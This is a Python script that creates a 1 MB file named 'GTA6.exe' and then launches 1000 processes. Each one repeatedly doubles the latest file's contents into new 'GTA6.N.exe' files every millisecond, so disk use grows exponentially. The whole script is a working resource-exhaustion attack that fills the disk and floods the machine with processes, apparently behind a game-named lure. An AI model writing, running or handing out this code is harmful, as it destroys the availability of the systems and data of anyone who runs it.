import os
import time
import multiprocessing
import signal
import sys

# Global flag to control the replication process
stop_replication = False

def replicate_file(file_path, counter):
    with open(file_path, 'rb') as file:
        data = file.read()

    # Double the size of the data
    doubled_data = data * 2

    # Create a new file name with a unique counter
    new_file_path = f'GTA6.{counter}.exe'
    with open(new_file_path, 'wb') as new_file:
        new_file.write(doubled_data)

    return new_file_path

def replication_worker(initial_file_path, queue):
    global stop_replication
    counter = 0
    while not stop_replication:
        initial_file_path = replicate_file(initial_file_path, counter)
        counter += 1
        time.sleep(0.001)  # Adjust the sleep time to control the replication rate
        queue.put(initial_file_path)

def signal_handler(sig, frame):
    global stop_replication
    print("Stopping replication...")
    stop_replication = True

def main():
    initial_file_path = 'GTA6.exe'
    with open(initial_file_path, 'wb') as file:
        file.write(b'0' * 1 * 1024 * 1024)  # Create a 1 MB file

    # Set up signal handler to stop the replication
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Create a queue to manage the file paths
    queue = multiprocessing.Queue()

    # Create multiple processes for replication
    processes = []
    for _ in range(1000):  # Adjust the number of processes as needed
        process = multiprocessing.Process(target=replication_worker, args=(initial_file_path, queue))
        process.start()
        processes.append(process)

    # Wait for all processes to finish
    for process in processes:
        process.join()

if __name__ == "__main__":
    main()